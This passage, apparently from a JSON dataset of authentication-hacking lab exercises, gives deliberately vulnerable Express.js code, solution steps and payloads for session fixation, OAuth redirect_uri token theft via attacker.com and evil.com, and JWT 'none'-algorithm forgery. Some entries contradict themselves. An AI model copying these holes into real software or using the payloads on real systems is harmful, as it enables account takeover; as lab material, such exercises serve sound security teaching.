    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.use((req, res, next) => { let sid = req.cookies.session; if (!sid) { sid = req.query.sid || Math.random().toString(36).substring(2); res.cookie('session', sid); } req.sessionID = sid; next(); }); app.post('/login', (req, res) => { const { username } = req.body; sessions[req.sessionID] = { username }; res.send('Logged in'); }); app.get('/account', (req, res) => { const user = sessions[req.sessionID]; if (user) res.send(`Account page of ${user.username}`); else res.send('Not logged in'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "session=attacker123",
      "session=sharedToken42",
      "session=testsession001"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration vulnerability in redirect_uri",
    "Lab Description": "This lab features a misconfigured OAuth flow that fails to validate redirect_uri strictly, allowing an attacker to intercept tokens by exploiting open redirect behavior. The application integrates with an OAuth provider for authentication. To solve: Exploit the misconfiguration to capture Carlos’s access token via an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate the OAuth flow and observe the redirect_uri parameter using Burp Suite.",
      "Modify redirect_uri to an attacker-controlled domain while preserving the base domain.",
      "Host a simple token-stealing page that logs query parameters (e.g., access_token).",
      "Send the malicious link to the victim (simulated within lab).",
      "Access the captured token from logs and replay it to impersonate the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokenStore = { 'carlos': 'abcd123token' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const accessToken = tokenStore['carlos']; const redirectUrl = `${redirect_uri}?access_token=${accessToken}&state=${state}`; res.redirect(redirectUrl); }); app.get('/profile', (req, res) => { const token = req.query.access_token; if (token === tokenStore['carlos']) res.send('Carlos Profile Page'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/capture",
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/oauth-callback",
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/redirect&state=xyz"
    ]
  },
  {
    "Lab scenario": "JWT tampering to escalate privileges in API access",
    "Lab Description": "This lab features a RESTful API that uses JWTs for authentication. The backend accepts unsigned JWTs due to a missing verification check. The application uses the 'role' claim to restrict access to administrative endpoints. To solve: forge a JWT granting admin access and retrieve the sensitive data from the /admin/report endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture JWT using Burp Suite when logged in as a normal user",
      "Send token to jwt.io or use jwt_tool to inspect token structure and verify the 'alg' header is set to 'none'",
      "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set alg to 'none'",
      "Remove the signature entirely, rebase64 the header and payload, and reconstruct the JWT",
      "Send request to /admin/report with the forged token in Authorization header to access protected resource"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/api/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'none' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); if (payload.role === 'admin') { res.send('Sensitive admin report data'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation in login redirection flow",
    "Lab Description": "The application uses a session cookie to manage authenticated users, but fails to issue a new session identifier upon successful login. An attacker can preset a session ID for the victim, then trick them into authenticating with it. To solve: hijack Carlos’s session by forcing him to log in using a fixed session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start a session with a custom session ID using Burp (e.g., Cookie: session=attacker123)",
      "Browse to the login endpoint and log in using your own credentials with the crafted session ID",
      "Send the session URL to Carlos (e.g., /login?redirect=/my-account with cookie=session=attacker123)",
      "Wait for Carlos to log in; session cookie remains attacker123 due to missing regeneration",
      "Use the same session cookie (attacker123) to access /my-account as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'secret123' } }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username].password === password) { res.send('Logged in'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'attacker123') { res.send('Welcome Carlos, here is your account'); } else { res.send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Cookie: session=attacker123",
      "/login?username=carlos&password=secret123",
      "/my-account with Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referrer header",
    "Lab Description": "The application uses an OAuth 2.0 implicit flow and places access tokens in the URL fragment. However, a redirect to a third-party domain causes the access token to leak via the Referer header. To solve: capture Carlos’s token via a malicious redirect and use it to access his data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login flow and observe token returned in URL fragment (e.g., #access_token=xyz)",
      "Craft a redirect_uri to attacker.com/capture that causes the browser to send the Referer with the full URL",
      "Send phishing link to Carlos containing redirect_uri=https://attacker.com/capture",
      "Set up HTTP listener on attacker.com to capture Referer with access token",
      "Use captured access token in Authorization header to call /api/user-data as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { res.send(`<script>window.location='https://attacker.com/capture#' + window.location.hash.substr(1);</script>`); }); app.get('/api/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-access-token') res.send('Carlos private data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "https://target.com/oauth/callback#access_token=carlos-access-token",
      "Referer: https://target.com/oauth/callback#access_token=carlos-access-token",
      "Authorization: Bearer carlos-access-token"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in login endpoint",
    "Lab Description": "The application's login mechanism uses JSON Web Tokens for session management but fails to validate the algorithm field properly. The application blindly trusts tokens signed with 'none' as valid. To solve: gain access to Carlos's account by forging a valid token without knowing the secret.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept a login request and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm value in the header is set to HS256.",
      "Modify the algorithm to 'none' and remove the signature portion of the token.",
      "Change the payload section to {\"username\":\"carlos\"} and re-encode the token with no signature.",
      "Replay the request with the forged JWT in the Authorization header and access the /my-account endpoint to verify success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') res.send('Welcome carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Lab running...'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via redirect URI",
    "Lab Description": "This lab's OAuth implementation uses an implicit grant flow that leaks the access token in the redirect URI. The application does not sanitize or securely handle fragment identifiers, allowing an attacker to steal tokens via referer headers. To solve: extract Carlos's token and use it to access his protected profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to proxy a login via OAuth and capture the redirection URI that includes the access token.",
      "Observe that the access token appears in the URL fragment (e.g., #access_token=XYZ).",
      "Inject a redirect URI during the OAuth handshake that points to your attacker server and logs the fragment token.",
      "Once Carlos logs in via the crafted link, intercept the token on your server via HTTP referer or browser-side script.",
      "Use the stolen token in an Authorization header to access /user/profile and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token-abc123'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token-abc123') res.send('Carlos Profile'); else res.status(403).send('Access denied'); }); app.listen(4001, () => console.log('OAuth Token Leak Lab running...'));",
    "payloads": [
      "https://attacker.com/callback#access_token=carlos-oauth-token-abc123",
      "Authorization: Bearer carlos-oauth-token-abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in change-password endpoint",
    "Lab Description": "The application assigns a new session cookie upon login, but the session is not properly regenerated after sensitive operations. This allows an attacker to fix a session ID before victim login. To solve: set a session for Carlos before he logs in and hijack his session after he changes his password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Postman, initiate a GET /session with a custom session ID and send it to the victim via social engineering.",
      "Once the victim logs in, reuse the same session cookie to validate it has been fixed.",
      "Capture the request when the victim changes their password — session ID remains unchanged.",
      "Replay the session cookie in your browser or client to hijack the victim's session.",
      "Access /my-account with the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'oldpass' }]; app.get('/session', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substring(7); sessions[sid] = null; res.cookie('sid', sid); res.send('Session created'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); sessions[sid] = username; res.send('Logged in'); }); app.post('/change-password', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) { users.find(u => u.username === user).password = req.body.newPassword; res.send('Password changed'); } else res.status(403).send('Not logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] === 'carlos') res.send('Welcome carlos'); else res.send('Access denied'); }); app.listen(4002, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "GET /session?sid=attackerfixed123",
      "Cookie: sid=attackerfixed123",
      "POST /login with sid=attackerfixed123",
      "POST /change-password with sid=attackerfixed123"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
    "Lab Description": "This lab demonstrates a misconfigured JWT validation mechanism where the application fails to verify token signatures if the algorithm is set to 'none'. The application trusts JWTs from the Authorization header for user session validation. To solve: Forge a JWT for the admin user by modifying the algorithm to 'none' and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send a valid login request and capture the returned JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io and observe that the algorithm is 'HS256'.",
      "3. Modify the JWT header to set \"alg\":\"none\" and change the payload's \"username\" to \"admin\".",
      "4. Remove the signature portion of the JWT and reconstruct the token using only header.payload.",
      "5. Use Burp Repeater to send a GET request to /admin-dashboard with the forged JWT in the Authorization header.",
      "6. If successful, the admin dashboard will load, confirming that the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 's3cret'; app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') return res.send('Welcome admin!'); else return res.status(403).send('Access denied'); } catch (err) { return res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation via Unvalidated Session ID in URL",
    "Lab Description": "This lab illustrates session fixation where the server accepts any arbitrary session ID supplied via a URL query parameter without validation or regeneration on login. The application does not issue a new session ID after successful authentication. To solve: Fix the victim's session ID before login, then log in with their credentials and access the profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login?sessionId=attacker-session request and send it to Repeater.",
      "2. Visit the /register endpoint and create a dummy account using the attacker-session value as the session cookie.",
      "3. Log out and convince the victim (Carlos) to click a crafted link: /login?sessionId=attacker-session.",
      "4. Use Burp to replay the login request for Carlos with the sessionId attacker-session and his credentials.",
      "5. Access /my-account while using the same session ID to confirm access to Carlos's profile page.",
      "6. The lab is solved when you view Carlos's account details with a fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospw' }]; app.get('/login', (req, res) => { const sessionId = req.query.sessionId; sessions[sessionId] = null; res.send(`<form method='POST' action='/authenticate?sessionId=${sessionId}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/authenticate', (req, res) => { const sessionId = req.query.sessionId; let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); const user = users.find(u => u.username === params.get('username') && u.password === params.get('password')); if (user) { sessions[sessionId] = user.username; res.redirect(`/my-account?sessionId=${sessionId}`); } else { res.status(403).send('Login failed'); } }); }); app.get('/my-account', (req, res) => { const sessionId = req.query.sessionId; const user = sessions[sessionId]; if (user) res.send(`Welcome ${user}, this is your account`); else res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "/login?sessionId=attacker-session",
      "/authenticate?sessionId=attacker-session",
      "/my-account?sessionId=attacker-session"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "This lab showcases an OAuth implementation vulnerable to an open redirect flaw in its redirect_uri parameter. The authorization server fails to strictly validate redirect URIs, allowing attackers to hijack authorization codes. To solve: Trick the victim into authorizing your application, intercept the OAuth code via a malicious redirect URI, and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to scan the /authorize?redirect_uri parameter for weak validation patterns.",
      "2. Discover that the app accepts subdomains of example.com and permits wildcard matching.",
      "3. Create a payload with redirect_uri=https://attacker.example.com/callback and register a listener.",
      "4. Trick the victim into clicking a crafted URL to initiate OAuth flow: /authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code.",
      "5. Capture the authorization code on your listener, then POST it to /oauth/token to retrieve the access token.",
      "6. Use the access token to access /profile with Authorization: Bearer <token> and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validClients = ['trusted-client']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); if (redirect_uri.includes('.example.com')) { const authCode = 'authcode-carlos'; res.redirect(`${redirect_uri}?code=${authCode}`); } else { res.status(400).send('Invalid redirect'); } }); app.post('/oauth/token', (req, res) => { let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); if (params.get('code') === 'authcode-carlos') res.json({ access_token: 'token-carlos' }); else res.status(403).send('Invalid code'); }); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-carlos') res.send('Welcome back, Carlos. Here is your profile.'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "/authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code",
      "POST /oauth/token with code=authcode-carlos",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
    "Lab Description": "This lab implements stateless authentication using JWTs passed in the Authorization header. The backend fails to validate the algorithm used in the JWT header. The application trusts any token as long as the signature structure is present. To solve: Forge a JWT that grants access to Carlos’s account using the 'none' algorithm.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the Authorization header during login using Burp Suite.",
      "Send the token to jwt.io or manually decode it to inspect its header and payload.",
      "Modify the JWT header by changing 'alg' to 'none' and removing the signature.",
      "Manually update the payload to impersonate the user 'carlos'.",
      "Use Postman to craft a new request with the forged Authorization header and access /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Unauthorized'); res.send(`Welcome ${decoded.payload.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Open redirect abuse in OAuth flow for token theft",
    "Lab Description": "The lab uses OAuth to authenticate users via a third-party provider. The 'redirect_uri' parameter is not properly validated, allowing attackers to intercept the access token after successful login. To solve: Capture the access token issued to Carlos by abusing the redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate the OAuth login and intercept the authorization request using Burp Suite.",
      "Modify the 'redirect_uri' parameter to point to your attacker-controlled server (e.g. https://attacker.com/callback).",
      "Start a listener on the attacker-controlled server to capture redirected URLs.",
      "Share the malicious OAuth link with Carlos and wait for him to authenticate.",
      "Extract the access_token from the captured URL fragment and use it with Postman to call /my-account with Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const qs = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token123_for_carlos'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123_for_carlos') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vuln-site.com/auth?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback#access_token=token123_for_carlos",
      "Authorization: Bearer token123_for_carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation using static token in cookie",
    "Lab Description": "The app issues session cookies with predictable static values tied to usernames, and fails to regenerate sessions on login. Attackers can set a valid cookie before login, leading to session fixation. To solve: Fix Carlos’s session, then use the token to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to inspect the Set-Cookie value on your own login and note its static structure (e.g., session=<username>_token).",
      "Manually craft a session cookie as 'session=carlos_token' and inject it using Burp or Postman.",
      "Share a crafted login URL with Carlos that preserves the malicious session.",
      "Wait for Carlos to authenticate using your crafted session.",
      "Revisit /my-account with the same cookie to confirm session fixation and access Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = ['alice', 'carlos']; app.get('/login', (req, res) => { const { username } = req.query; if (users.includes(username)) { res.cookie('session', `${username}_token`); res.send('Logged in'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; if (token === 'carlos_token') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=carlos_token",
      "https://vuln-app.com/login?username=carlos",
      "Set-Cookie: session=carlos_token"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in REST API authentication",
    "Lab Description": "The backend uses JSON Web Tokens (JWT) for stateless authentication and incorrectly accepts tokens signed with 'none' algorithm. The application fails to validate the token signature properly, allowing attackers to forge tokens. To solve: Forge an admin JWT and access the /admin/dashboard endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or Postman to log in as a regular user and capture the JWT from the Authorization header.",
      "Use jwt.io to decode the token and observe it uses HS256 algorithm.",
      "Craft a new JWT with the same payload but change the 'alg' to 'none' and remove the signature.",
      "Replace the original JWT in Burp with the modified unsigned token and set 'role' to 'admin'.",
      "Send a request to GET /admin/dashboard and confirm admin access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Admin access granted'); } const verified = jwt.verify(token, SECRET); if (verified.role === 'admin') return res.send('Admin access granted'); } catch (e) { return res.status(403).send('Invalid token'); } res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "{alg: 'none', payload: { username: 'carlos', role: 'admin' }}",
      "Authorization: Bearer <forged-jwt>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "The application assigns session tokens before authentication and fails to regenerate them post-login. This allows attackers to fix a session ID for the victim and hijack the session. To solve: Fix a session for Carlos, let him authenticate, then access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to initiate a session and capture your session ID from the Set-Cookie header.",
      "Share the fixed session ID link with the victim, e.g., /login?sessionid=abc123.",
      "Assume the victim logs in via the crafted link and binds the session to their authenticated context.",
      "Send a GET /my-account request with the fixed session ID in Cookie header.",
      "Access Carlos’s account details to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/login', (req, res) => { let sessionId = req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Login failed'); const sid = req.cookies.sessionid; sessions[sid] = { username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]) return res.send(`Account: ${sessions[sid].username}`); res.send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login?sessionid=fixed123",
      "Cookie: sessionid=fixed123",
      "POST /login with body: username=carlos&password=letmein",
      "GET /my-account with Cookie: sessionid=fixed123"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The OAuth flow accepts a wide range of redirect URIs without strict validation. This allows an attacker to inject malicious domains to capture authorization codes. To solve: Exploit the open redirect to capture Carlos’s OAuth token and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login and intercept the request to the /auth endpoint using Burp.",
      "Modify the redirect_uri parameter to point to your malicious server (e.g., https://evil.com/callback).",
      "Host a listener on https://evil.com/callback to capture the code from query string.",
      "Exchange the stolen code for a token using the /oauth/token endpoint.",
      "Use the token to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const authorizedRedirects = []; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?code=auth123`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'auth123') return res.json({ access_token: 'token-for-carlos' }); res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-for-carlos') return res.send('Carlos account details'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "GET /auth?redirect_uri=https://evil.com/callback",
      "https://evil.com/callback?code=auth123",
      "POST /oauth/token with body: code=auth123",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm",
    "Lab Description": "This lab implements JWT-based session management using insecure algorithm validation. The application accepts JWTs from authenticated users, but fails to enforce proper signature validation. To solve: Tamper with the JWT to impersonate Carlos and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request after logging in with a low-privilege account and copy the JWT from the Authorization header.",
      "Send the request to Repeater and decode the JWT using jwt.io or a Burp extension.",
      "Change the 'alg' value in the JWT header to 'none' and modify the payload to set \"username\": \"carlos\".",
      "Remove the JWT signature (everything after the second period) and re-encode the JWT.",
      "Replace the original JWT in the Authorization header with your tampered token and resend the request to access Carlos’s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } res.status(403).send('Invalid login'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token); if (payload.username === 'carlos') return res.send('Welcome Carlos!'); res.send('Not Carlos'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab's session management is flawed due to predictable session tokens assigned before login. The application issues a session cookie before authentication and fails to regenerate it after successful login. To solve: Fixate a known session on Carlos and reuse it post-login to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept your session when you visit the login page without logging in.",
      "Share your current session token (cookie) with the victim through a crafted phishing link or injection vector.",
      "Simulate the victim logging in using the same session (use curl or Postman with victim’s credentials and your session ID).",
      "After login, use your browser with the fixated session ID to access the My Account page.",
      "Confirm the identity switch and access Carlos’s account to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.sessionid) res.cookie('sessionid', uuid.v4()); res.send('Please log in'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; if (users[username] === password) sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Welcome back, Carlos!'); res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Fixated session ID via cookie injection",
      "Set-Cookie: sessionid=known-value",
      "Simulated POST /login with sessionid=known-value and carlos credentials"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow redirect URI manipulation",
    "Lab Description": "This lab uses OAuth 2.0 implicit flow, but its redirect URI validation is poorly implemented. The redirect URI can be manipulated to leak the access token to an attacker-controlled domain. To solve: Steal Carlos’s access token using an open redirect and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the OAuth flow when logging in and observe the redirect_uri parameter.",
      "Craft a redirect_uri pointing to an attacker-controlled domain, like https://attacker.com#access_token=",
      "Send the manipulated login link to Carlos (or simulate clicking it with Carlos’s session).",
      "Capture the leaked token on your server by checking access logs or using a webhook endpoint.",
      "Use the stolen token in a Bearer Authorization header to access /user-profile and retrieve Carlos’s data."
    ],
